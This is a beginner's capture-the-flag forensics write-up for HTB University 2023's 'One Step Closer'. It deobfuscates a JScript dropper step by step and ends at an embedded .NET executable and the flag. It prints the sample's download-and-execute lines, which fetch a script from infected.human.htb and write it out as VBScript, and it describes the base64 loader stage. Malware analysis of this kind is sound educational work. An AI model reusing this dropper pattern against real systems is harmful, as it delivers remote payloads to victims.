# Forensics - One Step Closer

I'm new to CTFs/write-ups in general so I'll start HTB University 2023: Brains & Bytes write up with the hardest challenge I completed.

We are presented with the prompt:

>Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, 
inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future.

and the "helpful" file given to me was [vaccine.js](./vaccine.js)

The first thing I did was use `file` on vaccine.js and see `vaccine.js: ASCII text, with very long lines` nothing out of sorts beyond the very long lines hinting at the soon to come unpleasantness of vaccine.js

Opening the file in a text editor I am presented with ~50 or so lines of javascript that has been obfuscated somewhat by very long nonsensical variable names. The program appears to create some Web Programming/Windows objects, connect to a website to get malicious code that it then writes to a file as a VB script and executes.

I have never used/read JavaScript of any kind really before today but skimming the file these lines seem to be the ones most important for the challange:

```javascript
lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.open("GET", "http://infected.human.htb/d/BKtQR", false);
lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.send();
if (lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.status === 200) {
    var scriptText = lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.responseText;
    var niyXKljCzNIENaWUxwYBODsAbUBFKCJJDbfyisBKTJpULtjrXSJIFBuGWkcmuhgDVdoSEMJPHvMzQiawcsBNhsfKbJlyQjzKLgnECDbAprhNSnXpNJwbwMQZWzJFAaxCQavQsDuRRIYXARrTgOjQgNHKgerFZvrghSUylvwuvszeCUHWvaOxTjgJDUzNCjCHYBnfbGOX = JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw.CreateTextFile(iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbi, true);
    niyXKljCzNIENaWUxwYBODsAbUBFKCJJDbfyisBKTJpULtjrXSJIFBuGWkcmuhgDVdoSEMJPHvMzQiawcsBNhsfKbJlyQjzKLgnECDbAprhNSnXpNJwbwMQZWzJFAaxCQavQsDuRRIYXARrTgOjQgNHKgerFZvrghSUylvwuvszeCUHWvaOxTjgJDUzNCjCHYBnfbGOX.write(scriptText);
```
I attempted to visit that URL through my browser and even when connceted to the CTF VPN I wasn't able to connect, when I see they have a Docker instance to be spawned and provide the netcat command to connect to it.

For anyone like me who wasn't aware of netcat before:
>Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.
It is designed to be a reliable "back-end" tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.

Using this and some brief googling on how to format/send HTTP GET requests I try 
```
netcat [Docker IP] [Port]
GET infected.human.htb/d/BKtQR
Host:[Docker IP]:[Port]
```
The return from this was a ton of text that overwhelmed my console screen so I ran the above again and sent the output to [vaccineGET.txt](./vaccineGET.txt). Contained therein was ~1000 lines of text obfuscated again as before with incredibly long variable names and massive strings, and numerous repeated sections.

Admittedly this took me a few hours to parse and figure out as there were a couple red herrings/fruitless paths I pursued, but in the end here are the key bits (names abbreviated for readability):

>ceihQq[more characters]  = [Base64 string & var1 & var 2 & var1]
>
>ceihQq = Repalce(ceihQq, var1 + var2 + var1, "P")

This variable is assigned a series of what appear to be either random characters or Base64 encoded strings that are concatenated with 2 variables in the form of '& var1 & var2 & var1' to form one greater string. My first assumption was to decode the various base64 strings which showed the word zombie repeating and not much else.

Taking the second line and replacing all the concats with the letter P, I now had the [ceihQq string](./secondstring.txt) constructed

Moving on the remainder of the file was made up of repeating fragments that didn't seem to have any meaning as well as the following:

>tomq[many characters] = "'$Codigo = ''" & ceihQq & "''"
>
>tomq = tomq & (series of StrReverse() strings)
>
>Numerous tomq = tomq & [100+ character strings] x ~860
>
>tomq = Replace(tomq, [Long string pattern], [Single Character] x5

Now I had the initial string for tomq and ceihQq, from here I ripped the 800+ lines of tomq concats and dumped them into a [text file](./strings.txt)  and used some [python](./decode.py) to process all of the text manipulation to see:

```python
f = open('strings.txt')
tomqString = ';$OWjuxd=[system.Text.enconding]::Unicdode.GetString'
for line in f:
    line = line[line.index('"')+1:-2]
    tomqString += line
f.close()
tomqString = tomqString.replace("TQIJoIsDKygFhOhIUsFhmYGpMtHYXYriuBkzrHlGxHgtwOVBcJpaoSYXwYihoBDwDRSCDEGplfmoDjPrgYmdejlOxRRTwXXqUxtEpkdbzFGZtRYqCBgefVWmDfUZnbLpaQQTIAMcveTJekTjNZjNfCJawQsxvvTLaqAKZUciNlCQgVQFoKfnXYUTpOaNcbqsaDpdjNnD", "e")
tomqString = tomqString.replace("YdiovnqyjTDXTaRYzrOrPtPSPEkGydtHpsDzuMmtvwWDgfonHmlbiWofBzfzWwPCyghETBLJtSXhZTteJymwidWxlLmZRoJmxzHcFtMNHFLqYxcpgFpHeIhwiWILHovZEyZuwgHbTGwMVrwwjpWojiuZPXGPnkWzSsIhWOckYJSLGuGYaBQbdomrjcmnDFZVNWqVGjwx", "o")
tomqString = tomqString.replace("ZjJMuHOyfLrFRZQLRAMejVORkrLmnSCXRqVNBLINqTtavYGXNKmWkKgLUKpRuknZoStcKiPTtlSLTzbLLKnqBLvCxwwfYDUEJVRbZAqnPXJFfwKgaKoaTyXvWlktaXauDNHvgmoqbgdjOoBAwieAxhmIQTQGWVjowvkJpSMpEPnfitrQGRfXaVLxUPAmLRGwRAEgjqTg", "s")
tomqString = tomqString.replace("SjnKkClLMbtbUbEphNmdQTEXfhFHyXgQvKXvohDxuaGQdsTVSnrqEPEsLAdRQxDbDqFawzwRYThIFGZFjDIAEWMnWgxyLATxLKfXLJGtQgEqlXlrEBLbufduqlrgvcKaQAuxxmISiInqdFxetxSvuwcnvTQZlRnsnrezMZamRBgFTQGJcmEpKQISyYXRLVbdBQEdwdle", "t")
tomqString = tomqString.replace("VXIxBYQSKDryEAULIfGtTdegkaavJdWnPtXZlxmbyRZbRztkgJXWSKYsPfdAvLjUlqQqikfohaKubLssSrhTyIatsqjlfjIBXVfmwFkVqYIyCtYmjprSExKIzpcAdoVBTPRwuxasqmXvYvnHQlXgZBCYBqolLMBaNbIspDogrWvPdQlBBtHAGkUozkbMEJZIHTuiLIxX", "a")
tomqString = tomqString.replace("tomqOXAFzrtBfQNTWGTuDgkLdYgzpoJtKGfuDsVESyJFHtcTuIutPkyuVQpwGLbFvLzIXmwguYvYDQgGkwihbveHvvcwfRqtjiREeQFyWwImwPIYWQUCUkxpKztLmHwNlIJgvNGzLQmRPuWNmhjWkXYLnDNfNpXwZwmVMhIMMViCmFVUKhHgGZowKYdAuCBFCwdFvnAC", "A")
print(tomqString)

codigoString = [Long ceihQq string above]
codigoString = codigoString.replace('em9tYmllc', 'A')
print(codigoString)
```
>;$OWjuxd=[system.Text.enconding]::Unicdode.GetString([system.Convert]::Frombase64string($codigo.replace(''em9tYmllc'',''A'')));

Adding that to the python file above and running the replace function gave a Base64 string that when decoded returned a URL for a jpeg and information about retrieving a base64 flag string to decode and load as malware to execute.

Using netcat as before to get the image file and continuing the forensics process running file on flag.jpg returned that it was a PNG file actually! Binwalk didn't return anything notable/interesting.

However when running strings on flag.jpg I see tacked on to the end of the file was yet another Base64 string. Decoding this and checking with file gives: "PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows"

Aha! Finally at the end the malware used by the attacker has been revealed! Running strings on the [malicious .exe](./flag.exe) gives the string: 

>HTB{0n3_St3p_cl0s3r_t0_th3_cur3}
